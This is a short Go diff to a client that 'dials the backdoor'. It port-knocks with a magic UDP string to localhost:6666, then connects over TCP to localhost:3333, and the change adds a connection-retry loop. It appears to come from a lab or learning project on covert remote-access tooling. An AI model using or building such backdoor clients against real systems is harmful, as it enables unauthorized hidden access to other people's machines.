@@ -12,6 +12,7 @@ import (
 	"net"
 	"os"
 	"sync"
+	"time"
 
 	"golang.org/x/crypto/hkdf"
 )
@@ -82,15 +83,24 @@ func recvThread(conn net.Conn, gcm cipher.AEAD, info []byte, wg *sync.WaitGroup)
 
 func main() {
 	// Begin connection
-	udp, err := net.Dial("udp", "localhost:6666")
-	if err != nil {
+	udp, uerr := net.Dial("udp", "localhost:6666")
+	if uerr != nil {
 		fmt.Println("Error dialing the backdoor, exiting...")
 		return
 	}
 	udp.Write([]byte("!@fizzbuzz@!"))
 	udp.Close()
-
-	conn, err := net.Dial("tcp", "localhost:3333")
+	var conn net.Conn
+	var err error
+	// Retry every 250ms depending on system
+	for i := 0; i < 6; i++ {
+		conn, err = net.Dial("tcp", "localhost:3333")
+		if err != nil {
+			time.Sleep(250 * time.Millisecond)
+		} else {
+			break
+		}
+	}
 	if err != nil {
 		fmt.Println("Error dialing the backdoor, exiting...")
 		return
